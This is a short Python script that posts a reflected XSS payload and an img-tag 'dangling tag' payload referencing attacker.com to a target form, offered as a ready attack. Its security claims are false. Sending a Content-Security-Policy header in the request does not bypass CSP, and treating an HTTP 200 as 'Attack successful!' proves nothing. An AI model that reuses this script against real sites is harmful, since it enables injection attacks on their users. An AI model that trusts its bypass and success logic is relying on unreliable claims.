import requests

# Set the target URL
target_url = "http://example.com/submit"

# Set the payload for the reflected XSS attack
payload = "<script>alert('XSS attack!');</script>"

# Set the payload for the dangling tag attack
dangling_tag = "<img src='http://attacker.com/malicious_image' onerror='alert(\"Dangling Tag Attack!\");'>"

# Set the headers to bypass the CSP protection
headers = {
    "Content-Security-Policy": "script-src 'self'; object-src 'none'",
    "Content-Type": "text/html"
}

# Construct the payload data
payload_data = {
    "input": payload + dangling_tag
}

# Send the POST request with the payload
response = requests.post(target_url, headers=headers, data=payload_data)

# Check the response
if response.status_code == 200:
    print("Attack successful!")
else:
    print("Attack failed.")
